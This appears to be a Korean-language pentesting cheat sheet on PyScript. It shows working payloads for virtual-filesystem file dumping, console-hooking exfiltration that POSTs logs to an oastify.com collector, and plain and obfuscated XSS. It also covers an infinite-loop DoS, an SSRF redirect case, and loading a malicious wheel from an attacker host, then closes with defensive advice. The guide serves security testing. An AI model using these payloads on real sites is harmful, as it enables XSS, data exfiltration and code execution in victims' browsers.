# Pyscript

## PyScript Pentesting 가이드

PyScript는 Python을 HTML에 통합하여 HTML과 함께 사용할 수 있도록 개발된 새로운 framework입니다. 이 cheat sheet에서는 penetration testing 목적으로 PyScript를 사용하는 방법을 확인할 수 있습니다.

### Emscripten virtual memory filesystem에서 파일 Dumping / Retrieving:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
코드:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
결과:

![PyScript Pentesting Guide - Emscripten 가상 메모리 파일 시스템에서 Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten 가상 메모리 파일 시스템의 OOB Data Exfiltration (콘솔 모니터링)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPkP5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
코드:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
결과:

![Emscripten virtual memory filesystem에서 파일 Dumping / Retrieving - Emscripten virtual memory filesystem의 OOB Data Exfiltration (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Result:

![Emscripten 가상 메모리 파일 시스템의 OOB Data Exfiltration (콘솔 모니터링) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

코드:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Result:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

코드:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
결과:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS 공격 (무한 루프)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS 공격 (무한 루프)

코드:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
결과:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 새로운 취약점 및 techniques (2023-2025)

### Server-Side Request Forgery via 제어되지 않는 리디렉션 (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0`은 Pyodide의 browser transport와 함께 사용될 때 `redirect` 및 `retries` request parameters를 무시합니다. 공격자가 target URLs에 영향을 줄 수 있다면, 코드에서 urllib3에 해당 리디렉션을 비활성화하도록 요청한 경우에도 cross-domain redirects를 따를 수 있어 SSRF 방어가 약화됩니다.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Node.js의 경우 `urllib3 >= 2.5.0`으로 업그레이드하되, 브라우저에서 redirect를 비활성화하기 위해 urllib3에 의존하지 말고 요청을 보내기 전에 destination을 검증하거나 allow-list를 적용하세요.<sup>[[4]](#references)</sup>

### 임의 패키지 로딩 및 supply-chain attacks

PyScript의 Pyodide 구성은 `packages`에서 임의의 wheel URL을 허용합니다. 공격자가 해당 구성을 수정하거나 주입할 수 있다면, 이후 import를 통해 피해자의 브라우저에서 공격자가 제어하는 Python이 실행될 수 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide는 패키지를 WebAssembly로 빌드하지 않고도 임의의 URL에서 pure-Python wheel을 설치할 수 있습니다.<sup>[[6]](#references)</sup> 이 configuration은 developer가 제어하도록 유지하고, 정확한 package name 또는 URL을 allow-list에 등록하며, build 또는 deployment 중 원격 wheel의 digest를 검증하세요.

### Output sanitisation changes (2023+)

* legacy examples에서 사용되는 2022.05.1 implementation에서는 `print()`가 HTML escaping 없이 `text/plain` output을 작성하므로 XSS에 취약합니다.<sup>[[8]](#references)</sup>
* 현재 `display()` helper는 plain string에 대해 기본적으로 HTML을 **escape**합니다. raw markup은 `pyscript.HTML()`로 감싸야 합니다.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
신뢰할 수 없는 입력에는 `display()`를 사용하고, 신뢰할 수 없는 문자열을 `HTML()`에 전달하지 마세요.<sup>[[2]](#references)</sup>

---

## Defensive Best Practices

* **패키지를 최신 상태로 유지** – Node.js에서 `urllib3 >= 2.5.0`을 사용하고 브라우저 리디렉션 가정을 별도로 검토하세요.<sup>[[4]](#references)</sup>
* **패키지 소스를 제한** – PyPI 이름 또는 정확히 신뢰할 수 있는 URL을 allow-list에 추가하고, 빌드 또는 배포 중 원격 wheel digest를 검증하세요.<sup>[[5]](#references)[[6]](#references)</sup>
* **Content Security Policy 강화** – 인라인 JavaScript (`script-src 'self' 'sha256-…'`)를 허용하지 않아 삽입된 `<script>` 블록이 실행되지 않도록 하세요.
* **사용자가 제공한 `<py-script>` / `<script type="py">` 태그를 허용하지 않기** – 다른 사용자에게 다시 출력하기 전에 서버에서 HTML을 sanitise하세요.
* **worker 격리** – worker에서 DOM에 동기식으로 액세스할 필요가 없다면 `sync_main_only` 플래그를 활성화하여 `SharedArrayBuffer` 및 관련 CORS header 요구 사항을 방지하세요.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins 문서 – `display` 및 `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Vulnerability Chaining의 기술 (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3 보안 권고 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript 설정 문서 – packages 및 `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – 패키지 로드](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript 2022.05.1 `pyscript.py` 구현](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
